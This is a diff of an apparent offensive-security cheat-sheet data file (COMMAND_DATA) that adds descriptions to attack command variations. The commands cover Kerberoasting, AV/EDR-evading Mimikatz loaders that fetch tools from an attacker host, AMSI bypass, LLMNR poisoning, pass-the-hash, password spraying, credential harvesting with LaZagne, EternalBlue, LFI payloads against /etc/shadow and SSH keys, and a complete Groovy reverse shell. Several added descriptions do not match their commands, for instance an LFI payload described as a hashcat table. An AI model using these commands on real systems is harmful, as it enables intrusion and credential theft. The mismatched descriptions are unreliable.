+          "description": "Uses Impacket GetUserSPNs to perform Kerberoasting - requests service tickets for accounts with SPNs and outputs the TGS hashes for offline cracking."
         },
         {
           "label": "Pass-the-ticket",
-          "command": "GetUserSPNs.py -k -no-pass -dc-ip <dc_ip> <domain>/<user> -request -outputfile hashes.txt"
+          "command": "GetUserSPNs.py -k -no-pass -dc-ip <dc_ip> <domain>/<user> -request -outputfile hashes.txt",
+          "description": "Uses Impacket GetUserSPNs to perform Kerberoasting - requests service tickets for accounts with SPNs and outputs the TGS hashes for offline cracking."
         }
       ],
       "steps": [
@@ -60676,15 +61050,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Run a local assembly with args",
-          "command": "Loader.exe -path <local_exe_path> -args <arguments>"
+          "command": "Loader.exe -path <local_exe_path> -args <arguments>",
+          "description": "Runs a Mimikatz operation through an evasive loader (e.g., SafetyKatz) to bypass antivirus and EDR detections that would flag direct Mimikatz execution."
         },
         {
           "label": "Fetch + run from a web host (fileless)",
-          "command": "Loader.exe -path http://<attacker_ip>:<port>/<tool>.exe -args <arguments>"
+          "command": "Loader.exe -path http://<attacker_ip>:<port>/<tool>.exe -args <arguments>",
+          "description": "Runs a Mimikatz operation through an evasive loader (e.g., SafetyKatz) to bypass antivirus and EDR detections that would flag direct Mimikatz execution."
         },
         {
           "label": "Copy Loader to a remote host, then run over winrs",
-          "command": "winrs -r:<host> C:\\Users\\Public\\Loader.exe -path http://127.0.0.1:8080/<tool>.exe -args \"<args>\" \"exit\""
+          "command": "winrs -r:<host> C:\\Users\\Public\\Loader.exe -path http://127.0.0.1:8080/<tool>.exe -args \"<args>\" \"exit\"",
+          "description": "Runs a Mimikatz operation through an evasive loader (e.g., SafetyKatz) to bypass antivirus and EDR detections that would flag direct Mimikatz execution."
         }
       ],
       "steps": [
@@ -61046,19 +61423,23 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Command / OS",
-          "command": "Command Injection:     ;  &&\nOS Command Injection:  ;  &  |\nObject Injection:      ;  &  |"
+          "command": "Command Injection:     ;  &&\nOS Command Injection:  ;  &  |\nObject Injection:      ;  &  |",
+          "description": "Quick-reference comparison of special characters used across different injection types (OS command, SQL, LDAP, XPath, etc.). Each injection class has its own set of metacharacters that trigger interpretation."
         },
         {
           "label": "SQL / XQuery",
-          "command": "SQL Injection:    '  ,  ;  --  /* */\nXQuery Injection: '  ;  --  /* */"
+          "command": "SQL Injection:    '  ,  ;  --  /* */\nXQuery Injection: '  ;  --  /* */",
+          "description": "Quick-reference of SQL and XQuery injection metacharacters. Lists the special characters that break out of string contexts and inject query logic in each language."
         },
         {
           "label": "Code / LDAP / XPath",
-          "command": "Code Injection:  '  ;  --  /* */  $()  ${}  #{}  %{}  ^\nLDAP Injection:  *  (  )  &  |\nXPath Injection: '  or  and  not  substring  concat  count"
+          "command": "Code Injection:  '  ;  --  /* */  $()  ${}  #{}  %{}  ^\nLDAP Injection:  *  (  )  &  |\nXPath Injection: '  or  and  not  substring  concat  count",
+          "description": "Quick-reference of code injection, LDAP injection, and XPath injection metacharacters. Lists the syntax-breaking characters specific to each injection context."
         },
         {
           "label": "Traversal / Header / Shellcode",
-          "command": "Directory Traversal: ../  ..\\  %00\nHeader Injection:    \\n  \\r\\n  \\t  %0d  %0a  %09\nShellcode Injection: \\x  \\u  %u  %n"
+          "command": "Directory Traversal: ../  ..\\  %00\nHeader Injection:    \\n  \\r\\n  \\t  %0d  %0a  %09\nShellcode Injection: \\x  \\u  %u  %n",
+          "description": "Traversal / Header / Shellcode. See the command syntax for exact parameters and flags."
         }
       ],
       "opsec": "moderate",
@@ -61842,7 +62223,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Common options",
-          "command": ".\\Inveigh.exe -LLMNR Y -NBNS Y -FileOutput Y"
+          "command": ".\\Inveigh.exe -LLMNR Y -NBNS Y -FileOutput Y",
+          "description": "Runs the compiled Inveigh binary for network poisoning and hash capture. Standalone executable version that works without PowerShell."
         }
       ],
       "explain": "Poisons LLMNR/NBT-NS from a Windows foothold to capture NetNTLMv2 hashes (C# Inveigh):\n  .\\Inveigh.exe            start poisoning; the interactive console (GET NTLMV2UNIQUE, HISTORY, STOP) shows captured hashes live\nThe maintained C# build (preferred over the deprecated PS version); -LLMNR Y -NBNS Y -FileOutput Y enables the poisoners and writes hashes to disk. Crack captures with hashcat -m 5600."
@@ -62023,7 +62405,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "File output + only unique",
-          "command": "Invoke-Inveigh -NBNS Y -mDNS Y -FileOutput Y"
+          "command": "Invoke-Inveigh -NBNS Y -mDNS Y -FileOutput Y",
+          "description": "Runs Inveigh via PowerShell for LLMNR/NBNS/mDNS poisoning from a Windows host. Captures NTLMv2 hashes by responding to name resolution broadcast queries on the local network."
         }
       ],
       "explain": "The PowerShell LLMNR/NBT-NS poisoner - Responder for a Windows-only foothold:\n  Invoke-Inveigh Y         start with defaults enabled\n  -NBNS Y                  also answer NBT-NS name queries\n  -ConsoleOutput Y         print captured hashes to the console\n  -FileOutput Y            also write them to disk\nCaptures NetNTLMv2 hashes from other hosts on the subnet (crack with hashcat -m 5600). Deprecated in favor of the C# build."
@@ -62063,11 +62446,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Admin variant (uses PATH env)",
-          "command": "C:\\AD\\Tools\\InviShell\\RunWithPathAsAdmin.bat"
+          "command": "C:\\AD\\Tools\\InviShell\\RunWithPathAsAdmin.bat",
+          "description": "Launches PowerShell with InviShell to bypass AMSI, ScriptBlock logging, Module logging, and Transcription. Provides an unmonitored PowerShell session by hooking CLR-level functions."
         },
         {
           "label": "Manual COR_PROFILER setup (what the .bat does)",
-          "command": "set COR_ENABLE_PROFILING=1 & set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}"
+          "command": "set COR_ENABLE_PROFILING=1 & set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}",
+          "description": "Manual COR_PROFILER setup (what the .bat does). See the command syntax for exact parameters and flags."
         }
       ],
       "steps": [
@@ -62604,7 +62989,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Invoke-WMIExec (WMI PtH, no admin on attacker)",
-          "command": "Invoke-WMIExec -Target <ip> -Domain <domain> -Username <user> -Hash <nt_hash> -Command \"<command>\""
+          "command": "Invoke-WMIExec -Target <ip> -Domain <domain> -Username <user> -Hash <nt_hash> -Command \"<command>\"",
+          "description": "Invoke-WMIExec (WMI PtH, no admin on attacker). See the command syntax for exact parameters and flags."
         }
       ],
       "exam": "exam-ok",
@@ -63316,11 +63702,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Beautify with prettier",
-          "command": "prettier --parser babel main.js > main.pretty.js"
+          "command": "prettier --parser babel main.js > main.pretty.js",
+          "description": "Runs prettier for code formatting. Standardizes JSON or script formatting for consistency."
         },
         {
           "label": "Find all script sources on a page",
-          "command": "curl -s http://<target>/ | grep -oE 'src=\"[^\"]+\\.js\"' | cut -d'\"' -f2"
+          "command": "curl -s http://<target>/ | grep -oE 'src=\"[^\"]+\\.js\"' | cut -d'\"' -f2",
+          "description": "Downloads a file or script from a remote URL. Used for staging tools, payloads, or second-stage code on the target."
         }
       ],
       "defense": {
@@ -63748,7 +64136,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Windows Groovy reverse shell via Java Socket (Script Console)",
-          "command": "String host=\"<lhost>\";\nint port=<lport>;\nString cmd=\"cmd.exe\";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();\nSocket s=new Socket(host,port);\nInputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();\nOutputStream po=p.getOutputStream(),so=s.getOutputStream();\nwhile(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Thread.sleep(50); try{p.exitValue();break;}catch(Exception e){} }\np.destroy();s.close();"
+          "command": "String host=\"<lhost>\";\nint port=<lport>;\nString cmd=\"cmd.exe\";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();\nSocket s=new Socket(host,port);\nInputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();\nOutputStream po=p.getOutputStream(),so=s.getOutputStream();\nwhile(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Thread.sleep(50); try{p.exitValue();break;}catch(Exception e){} }\np.destroy();s.close();",
+          "description": "Windows Groovy reverse shell via Java Socket (Script Console). See the command syntax for exact parameters and flags."
         }
       ],
       "explain": "A Groovy reverse shell for the Jenkins script console (Linux):\n  Runtime.getRuntime().exec([...])   run a shell command from Groovy\n  exec 5<>/dev/tcp/<lhost>/<lport>   open a socket to your listener and pipe a shell over it\nRuns as the Jenkins user, calling back to a netcat listener; a Windows ProcessBuilder variant spawns cmd.exe the same way."
@@ -64285,31 +64674,38 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Single Mode",
-          "command": "john --single <hash_file>"
+          "command": "john --single <hash_file>",
+          "description": "Cracks password hashes with John the Ripper. Supports auto-detection of hash types, wordlist attacks, and custom rules. CPU-based but versatile with broad format support."
         },
         {
           "label": "Specify Format",
-          "command": "john --wordlist=/usr/share/wordlists/rockyou.txt --format=<format> <hash_file>"
+          "command": "john --wordlist=/usr/share/wordlists/rockyou.txt --format=<format> <hash_file>",
+          "description": "Cracks password hashes with John the Ripper. Supports auto-detection of hash types, wordlist attacks, and custom rules. CPU-based but versatile with broad format support."
         },
         {
           "label": "Show Cracked",
-          "command": "john --show <hash_file>"
+          "command": "john --show <hash_file>",
+          "description": "Cracks password hashes with John the Ripper. Supports auto-detection of hash types, wordlist attacks, and custom rules. CPU-based but versatile with broad format support."
         },
         {
           "label": "SSH key passphrase rules",
-          "command": "john --wordlist=<wordlist> --rules=sshRules <hash_file>"
+          "command": "john --wordlist=<wordlist> --rules=sshRules <hash_file>",
+          "description": "Cracks password hashes with John the Ripper. Supports auto-detection of hash types, wordlist attacks, and custom rules. CPU-based but versatile with broad format support."
         },
         {
           "label": "Incremental mode (brute all chars)",
-          "command": "john --incremental <hash_file>"
+          "command": "john --incremental <hash_file>",
+          "description": "Cracks password hashes with John the Ripper. Supports auto-detection of hash types, wordlist attacks, and custom rules. CPU-based but versatile with broad format support."
         },
         {
           "label": "Multiple formats auto-detect list",
-          "command": "john --list=formats | grep -i <type>"
+          "command": "john --list=formats | grep -i <type>",
+          "description": "Cracks password hashes with John the Ripper. Supports auto-detection of hash types, wordlist attacks, and custom rules. CPU-based but versatile with broad format support."
         },
         {
           "label": "Restore interrupted session",
-          "command": "john --restore"
+          "command": "john --restore",
+          "description": "Cracks password hashes with John the Ripper. Supports auto-detection of hash types, wordlist attacks, and custom rules. CPU-based but versatile with broad format support."
         }
       ],
       "opsec": "silent",
@@ -64949,7 +65345,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Corroborate version via Joomla stats API",
-          "command": "curl -s https://developer.joomla.org/stats/cms_version | python3 -m json.tool"
+          "command": "curl -s https://developer.joomla.org/stats/cms_version | python3 -m json.tool",
+          "description": "Downloads a file or script from a remote URL. Used for staging tools, payloads, or second-stage code on the target."
         }
       ],
       "explain": "Detects Joomla and reads its version:\n  curl -s http://<url>/   fetch the homepage\n  | grep Joomla           spot Joomla generator/meta tags\nConfirms the CMS; then read the version from /README.txt or /administrator/manifests/files/joomla.xml, and note the /administrator login path from robots.txt."
@@ -65452,19 +65849,23 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "SSH Key",
-          "command": "ssh2john.py <keyfile> > ssh.hash\njohn --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash\njohn ssh.hash --show"
+          "command": "ssh2john.py <keyfile> > ssh.hash\njohn --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash\njohn ssh.hash --show",
+          "description": "Cracks password hashes with John the Ripper. Supports auto-detection of hash types, wordlist attacks, and custom rules. CPU-based but versatile with broad format support."
         },
         {
           "label": "Office Doc",
-          "command": "office2john.py <file> > office.hash\njohn --wordlist=/usr/share/wordlists/rockyou.txt office.hash\njohn office.hash --show"
+          "command": "office2john.py <file> > office.hash\njohn --wordlist=/usr/share/wordlists/rockyou.txt office.hash\njohn office.hash --show",
+          "description": "Cracks password hashes with John the Ripper. Supports auto-detection of hash types, wordlist attacks, and custom rules. CPU-based but versatile with broad format support."
         },
         {
           "label": "PDF",
-          "command": "pdf2john.py <file> > pdf.hash\njohn --wordlist=/usr/share/wordlists/rockyou.txt pdf.hash\njohn pdf.hash --show"
+          "command": "pdf2john.py <file> > pdf.hash\njohn --wordlist=/usr/share/wordlists/rockyou.txt pdf.hash\njohn pdf.hash --show",
+          "description": "Cracks password hashes with John the Ripper. Supports auto-detection of hash types, wordlist attacks, and custom rules. CPU-based but versatile with broad format support."
         },
         {
           "label": "ZIP Archive",
-          "command": "zip2john <file> > zip.hash\njohn --wordlist=/usr/share/wordlists/rockyou.txt zip.hash\njohn zip.hash --show"
+          "command": "zip2john <file> > zip.hash\njohn --wordlist=/usr/share/wordlists/rockyou.txt zip.hash\njohn zip.hash --show",
+          "description": "Cracks password hashes with John the Ripper. Supports auto-detection of hash types, wordlist attacks, and custom rules. CPU-based but versatile with broad format support."
         }
       ],
       "opsec": "silent",
@@ -65753,7 +66154,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "OPSEC",
-          "command": ".\\Rubeus.exe kerberoast /rc4opsec /nowrap /outfile:spn.txt"
+          "command": ".\\Rubeus.exe kerberoast /rc4opsec /nowrap /outfile:spn.txt",
+          "description": "Uses Rubeus to perform Kerberoasting - requests service tickets for all accounts with SPNs and outputs the hashes for offline cracking. Runs in-memory on Windows without touching disk."
         }
       ],
       "steps": [
@@ -65991,23 +66393,28 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "PowerView/Empire Invoke-Kerberoast",
-          "command": "Invoke-Kerberoast -Identity <user> -Domain <domain> | fl"
+          "command": "Invoke-Kerberoast -Identity <user> -Domain <domain> | fl",
+          "description": "Uses PowerView to request Kerberos service tickets for all accounts with SPNs set, then outputs the ticket hashes in a format ready for offline password cracking with Hashcat or John."
         },
         {
           "label": "Crack hashes offline with John",
-          "command": "john.exe --wordlist=<wordlist> <hashfile>"
+          "command": "john.exe --wordlist=<wordlist> <hashfile>",
+          "description": "Cracks password hashes with John the Ripper. Supports auto-detection of hash types, wordlist attacks, and custom rules. CPU-based but versatile with broad format support."
         },
         {
           "label": "Crack with hashcat (TGS-REP m13100 / AS-REP m18200)",
-          "command": "hashcat -m 13100 <hashfile> <wordlist>"
+          "command": "hashcat -m 13100 <hashfile> <wordlist>",
+          "description": "Cracks Kerberoasted TGS-REP hashes (hashcat mode 13100). Takes the service ticket hash output from Kerberoasting tools and brute-forces the service account password."
         },
         {
           "label": "Rubeus - stats then RC4-only (opsec)",
-          "command": "Rubeus.exe kerberoast /stats\nRubeus.exe kerberoast /rc4opsec /outfile:hashes.txt"
+          "command": "Rubeus.exe kerberoast /stats\nRubeus.exe kerberoast /rc4opsec /outfile:hashes.txt",
+          "description": "Uses Rubeus to perform Kerberoasting - requests service tickets for all accounts with SPNs and outputs the hashes for offline cracking. Runs in-memory on Windows without touching disk."
         },
         {
           "label": "Rubeus - simple output",
-          "command": "Rubeus.exe kerberoast /simple /outfile:hashes.txt"
+          "command": "Rubeus.exe kerberoast /simple /outfile:hashes.txt",
+          "description": "Uses Rubeus to perform Kerberoasting - requests service tickets for all accounts with SPNs and outputs the hashes for offline cracking. Runs in-memory on Windows without touching disk."
         }
       ],
       "explain": "Requests TGS tickets for every account that has an SPN, for offline cracking:\n  kerberoast               roast all SPN accounts (add /user:<user> to target one, /stats to just list)\n  /rc4opsec                only roast accounts that support RC4, avoiding noisy AES-downgrade requests\n  /nowrap                  single-line hash output\n  /outfile:hashes.txt      save the hashes\nCrack offline with hashcat -m 13100 to recover the service account passwords."
@@ -66254,7 +66661,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Impacket getST",
-          "command": "getST.py -spn <spn> -impersonate administrator -dc-ip <dc_ip> <domain>/<user>:<password>"
+          "command": "getST.py -spn <spn> -impersonate administrator -dc-ip <dc_ip> <domain>/<user>:<password>",
+          "description": "Uses Impacket getST to request a Kerberos Service Ticket (TGS) for a specific SPN. Used in constrained delegation attacks, S4U abuse, and service ticket manipulation."
         }
       ],
       "steps": [
@@ -66750,11 +67158,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Password spray",
-          "command": "kerbrute passwordspray --dc <dc_ip> --domain <domain> <users_file> '<password>'"
+          "command": "kerbrute passwordspray --dc <dc_ip> --domain <domain> <users_file> '<password>'",
+          "description": "Performs password spraying via Kerberos pre-authentication using Kerbrute. Tests a single password against many accounts - generates fewer alerts than NTLM-based spraying."
         },
         {
           "label": "Brute-force one user",
-          "command": "kerbrute bruteuser --dc <dc_ip> --domain <domain> <wordlist> <username>"
+          "command": "kerbrute bruteuser --dc <dc_ip> --domain <domain> <wordlist> <username>",
+          "description": "Brute-forces passwords for a single user via Kerberos pre-authentication. Tests multiple passwords against one account using Kerbrute."
         }
       ],
       "explain": "Validates which usernames exist in AD via Kerberos pre-auth, without lockouts:\n  kerbrute userenum        enumerate valid users from KDC responses\n  --dc <dc_ip>             the Domain Controller\n  --domain <domain>        the domain\n  <names_file>             candidate usernames\nValid users give a distinct response and no failed-logon events; confirmed accounts become spray/AS-REP-roast targets. bruteuser brute-forces one user's password instead."
@@ -66940,7 +67350,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Single password, valid users",
-          "command": "kerbrute passwordspray -d <domain> --dc <dc_ip> valid_users.txt '<password>'"
+          "command": "kerbrute passwordspray -d <domain> --dc <dc_ip> valid_users.txt '<password>'",
+          "description": "Single password, valid users. See the command syntax for exact parameters and flags."
         }
       ],
       "steps": [
@@ -67125,7 +67536,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Single user check",
-          "command": "kerbrute userenum -d <domain> --dc <dc_ip> <username>"
+          "command": "kerbrute userenum -d <domain> --dc <dc_ip> <username>",
+          "description": "Uses Kerbrute to check if a single username exists in the domain via Kerberos pre-authentication responses. Stealthier than LDAP enumeration - only generates failed Kerberos events, not LDAP queries."
         }
       ],
       "steps": [
@@ -67341,15 +67753,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "wmic quickfix / Get-Hotfix",
-          "command": "wmic qfe list brief | findstr /C:KB & powershell Get-HotFix"
+          "command": "wmic qfe list brief | findstr /C:KB & powershell Get-HotFix",
+          "description": "Wmic quickfix / Get-Hotfix. See the command syntax for exact parameters and flags."
         },
         {
           "label": "WES-NG (offline, from systeminfo)",
-          "command": "python wes.py systeminfo.txt --exploits-only"
+          "command": "python wes.py systeminfo.txt --exploits-only",
+          "description": "WES-NG (offline, from systeminfo). See the command syntax for exact parameters and flags."
         },
         {
           "label": "Watson / Sherlock (on-host)",
-          "command": "# Watson.exe  |  Import-Module Sherlock.ps1; Find-AllVulns"
+          "command": "# Watson.exe  |  Import-Module Sherlock.ps1; Find-AllVulns",
+          "description": "Watson / Sherlock (on-host). See the command syntax for exact parameters and flags."
         }
       ],
       "steps": [
@@ -68662,11 +69077,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "NetExec module",
-          "command": "nxc ldap <dc_ip> -u <user> -p <password> -M laps"
+          "command": "nxc ldap <dc_ip> -u <user> -p <password> -M laps",
+          "description": "Uses CrackMapExec with the LDAP protocol for domain enumeration. Queries Active Directory directly for users, groups, and other objects."
         },
         {
           "label": "pyLAPS",
-          "command": "python3 pyLAPS.py --action get -u <user> -p <password> -d <domain> --dc-ip <dc_ip>"
+          "command": "python3 pyLAPS.py --action get -u <user> -p <password> -d <domain> --dc-ip <dc_ip>",
+          "description": "Runs a Python-based tool or script for exploitation, enumeration, or post-exploitation activities."
         }
       ],
       "steps": [
@@ -68927,23 +69344,28 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "New-PSSession (persistent reusable session)",
-          "command": "$sess = New-PSSession -ComputerName <host>\nEnter-PSSession -Session $sess"
+          "command": "$sess = New-PSSession -ComputerName <host>\nEnter-PSSession -Session $sess",
+          "description": "New-PSSession (persistent reusable session). See the command syntax for exact parameters and flags."
         },
         {
           "label": "Invoke-Command via saved session",
-          "command": "Invoke-Command -Session $sess -ScriptBlock { whoami }"
+          "command": "Invoke-Command -Session $sess -ScriptBlock { whoami }",
+          "description": "Executes a command or script block on a remote machine via PowerShell Remoting (WinRM). Uses the trusted PSRemoting channel for lateral movement - appears as legitimate admin activity."
         },
         {
           "label": "Discover where you have PSRemoting admin",
-          "command": "Find-PSRemotingLocalAdminAccess -Domain <domain> -Verbose"
+          "command": "Find-PSRemotingLocalAdminAccess -Domain <domain> -Verbose",
+          "description": "Discover where you have PSRemoting admin. See the command syntax for exact parameters and flags."
         },
         {
           "label": "winrs one-liner (cmd on remote host)",
-          "command": "winrs -r:<host> cmd /c \"set computername && set username\""
+          "command": "winrs -r:<host> cmd /c \"set computername && set username\"",
+          "description": "Winrs one-liner (cmd on remote host). See the command syntax for exact parameters and flags."
         },
         {
           "label": "WSManWinRM.exe (when winrs is blocked)",
-          "command": "WSManWinRM.exe <host_fqdn> \"cmd /c <command>\""
+          "command": "WSManWinRM.exe <host_fqdn> \"cmd /c <command>\"",
+          "description": "WSManWinRM.exe (when winrs is blocked). See the command syntax for exact parameters and flags."
         }
       ],
       "explain": "Moves laterally over PowerShell Remoting (WinRM, 5985/5986):\n  Enter-PSSession           open an interactive remote shell\n  -ComputerName <dc_host>  the target machine\n  -Credential (Get-Credential)   the credentials to authenticate with\nUse Invoke-Command -ScriptBlock/-FilePath for non-interactive execution or to load tools remotely; New-PSSession keeps a reusable session. Beware the double-hop issue when reaching a further host."
@@ -69265,11 +69687,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "All Verbose",
-          "command": "LaZagne.exe all -vv"
+          "command": "LaZagne.exe all -vv",
+          "description": "Runs LaZagne to extract stored credentials from all supported applications. Harvests passwords from browsers, email clients, databases, sysadmin tools, and WiFi profiles on the compromised host."
         },
         {
           "label": "Browsers (Linux)",
-          "command": "python3 laZagne.py browsers"
+          "command": "python3 laZagne.py browsers",
+          "description": "Runs a Python-based tool or script for exploitation, enumeration, or post-exploitation activities."
         }
       ],
       "opsec": "quiet",
@@ -69773,11 +70197,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Kerberos auth",
-          "command": "sudo ldapdomaindump -k -u '<domain>\\<user>' <dc_fqdn> -o loot/"
+          "command": "sudo ldapdomaindump -k -u '<domain>\\<user>' <dc_fqdn> -o loot/",
+          "description": "Runs ldapdomaindump with Kerberos authentication instead of NTLM. Useful when NTLM is disabled or you have a Kerberos ticket but not the plaintext password."
         },
         {
           "label": "Force LDAPS (636)",
-          "command": "sudo ldapdomaindump -u '<domain>\\<user>' -p '<password>' ldaps://<dc_ip> -o loot/"
+          "command": "sudo ldapdomaindump -u '<domain>\\<user>' -p '<password>' ldaps://<dc_ip> -o loot/",
+          "description": "Forces ldapdomaindump to use LDAPS (port 636) for encrypted communication. Required when the DC only accepts LDAP over TLS or to avoid network inspection."
         }
       ],
       "steps": [
@@ -69976,15 +70402,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "With authentication",
-          "command": "ldapsearch -x -H ldap://<dc_ip> -D '<user>@<domain>' -w '<password>' -b \"<base_dn>\" \"(objectClass=user)\" sAMAccountName"
+          "command": "ldapsearch -x -H ldap://<dc_ip> -D '<user>@<domain>' -w '<password>' -b \"<base_dn>\" \"(objectClass=user)\" sAMAccountName",
+          "description": "Queries Active Directory via LDAP with authenticated credentials. Retrieves user, group, or computer objects using LDAP filters from a Linux host."
         },
         {
           "label": "Anonymous bind",
-          "command": "ldapsearch -x -H ldap://<dc_ip> -b \"<base_dn>\" \"(objectClass=user)\""
+          "command": "ldapsearch -x -H ldap://<dc_ip> -b \"<base_dn>\" \"(objectClass=user)\"",
+          "description": "Performs an anonymous LDAP query against the domain controller. Works when anonymous binds are allowed - a common misconfiguration that exposes domain information without credentials."
         },
         {
           "label": "ldapsearch-ad.py - automated LDAP enum (all)",
-          "command": "ldapsearch-ad.py -l <dc_ip> -d <domain> -u <user> -p <password> -t all"
+          "command": "ldapsearch-ad.py -l <dc_ip> -d <domain> -u <user> -p <password> -t all",
+          "description": "Ldapsearch-ad.py - automated LDAP enum (all). See the command syntax for exact parameters and flags."
         }
       ],
       "explain": "Enumerates user accounts over LDAP:\n  ldapsearch -h <dc_ip> -x   query the DC with a simple bind\n  -b \"<base_dn>\" -s sub      search the whole domain subtree\n  \"(&(objectCategory=person)(objectClass=user))\"   filter to real users (not machine accounts)\n  | grep sAMAccountName      extract the login names\nGives a clean username list for kerbrute or spraying; add -D '<user>@<domain>' -w '<password>' for an authenticated bind when anonymous is disabled."
@@ -70178,7 +70607,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Just the lockout/length fields",
-          "command": "ldapsearch -h <dc_ip> -x -b \"<base_dn>\" -s sub \"*\" | grep -iE 'minPwdLength|lockoutThreshold|maxPwdAge'"
+          "command": "ldapsearch -h <dc_ip> -x -b \"<base_dn>\" -s sub \"*\" | grep -iE 'minPwdLength|lockoutThreshold|maxPwdAge'",
+          "description": "Just the lockout/length fields. See the command syntax for exact parameters and flags."
         }
       ],
       "explain": "Reads the password policy over raw LDAP:\n  ldapsearch -h <dc_ip>   the DC\n  -x                      simple (anonymous or basic) authentication\n  -b \"<base_dn>\"          search base (the domain DN)\n  -s sub \"*\"              subtree scope, all attributes\n  | grep -A 20 pwdHistoryLength   pull the policy attributes out\nGets lockout threshold, history, and complexity so you can plan spraying; add -D/-W for an authenticated bind."
@@ -70402,11 +70832,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "MS08-067 (Win XP/2003)",
-          "command": "use exploit/windows/smb/ms08_067_netapi"
+          "command": "use exploit/windows/smb/ms08_067_netapi",
+          "description": "Configures a Metasploit module for exploitation. Sets the target, payload, and options before launching the exploit."
         },
         {
           "label": "Manual EternalBlue (AutoBlue)",
-          "command": "python3 eternalblue_exploit7.py <target> shellcode/sc_x64.bin"
+          "command": "python3 eternalblue_exploit7.py <target> shellcode/sc_x64.bin",
+          "description": "Manual EternalBlue (AutoBlue). See the command syntax for exact parameters and flags."
         }
       ],
       "steps": [
@@ -70502,11 +70934,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Windows",
-          "command": "http://<ip>:<port>/index.php?language=..\\..\\..\\..\\Windows\\boot.ini"
+          "command": "http://<ip>:<port>/index.php?language=..\\..\\..\\..\\Windows\\boot.ini",
+          "description": "Reference table of hashcat mode numbers for Windows and Active Directory hash types. Covers NTLM, NetNTLMv1/v2, DCC, and Kerberos ticket formats."
         },
         {
           "label": "Absolute path",
-          "command": "http://<ip>:<port>/index.php?language=/etc/passwd"
+          "command": "http://<ip>:<port>/index.php?language=/etc/passwd",
+          "description": "Direct (absolute) path LFI that skips directory traversal by providing the full filesystem path. Works when the application does not prepend a directory to the user-supplied filename."
         }
       ],
       "opsec": "loud",
@@ -70817,7 +71251,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Discover .php pages before hunting LFI param",
-          "command": "ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u 'http://<ip>:<port>/FUZZ.php'"
+          "command": "ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u 'http://<ip>:<port>/FUZZ.php'",
+          "description": "Discover .php pages before hunting LFI param. See the command syntax for exact parameters and flags."
         }
       ],
       "type": "command",
@@ -71026,7 +71461,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Fuzz the parameter for traversal",
-          "command": "ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u 'http://<ip>:<port>/index.php?language=FUZZ' -fs <baseline_size>"
+          "command": "ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u 'http://<ip>:<port>/index.php?language=FUZZ' -fs <baseline_size>",
+          "description": "Fuzz the parameter for traversal. See the command syntax for exact parameters and flags."
         }
       ],
       "steps": [
@@ -71104,19 +71540,23 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Linux - creds/config",
-          "command": "/etc/passwd\n/etc/shadow\n/root/.ssh/id_rsa\n/home/<user>/.ssh/id_rsa\n/var/www/html/config.php\n/etc/apache2/apache2.conf"
+          "command": "/etc/passwd\n/etc/shadow\n/root/.ssh/id_rsa\n/home/<user>/.ssh/id_rsa\n/var/www/html/config.php\n/etc/apache2/apache2.conf",
+          "description": "Linux - creds/config. See the command syntax for exact usage and parameters."
         },
         {
           "label": "Linux - logs (poisoning)",
-          "command": "/var/log/apache2/access.log\n/var/log/apache2/error.log\n/var/log/nginx/access.log\n/var/log/auth.log\n/proc/self/environ\n/proc/self/fd/N"
+          "command": "/var/log/apache2/access.log\n/var/log/apache2/error.log\n/var/log/nginx/access.log\n/var/log/auth.log\n/proc/self/environ\n/proc/self/fd/N",
+          "description": "Reads web server access or error logs for information gathering. Logs reveal visited URLs, client IPs, user agents, and error messages that may expose internal paths or misconfigurations."
         },
         {
           "label": "Windows",
-          "command": "C:\\Windows\\System32\\drivers\\etc\\hosts\nC:\\Windows\\win.ini\nC:\\Windows\\System32\\config\\SAM\nC:\\inetpub\\wwwroot\\web.config\nC:\\xampp\\apache\\conf\\httpd.conf"
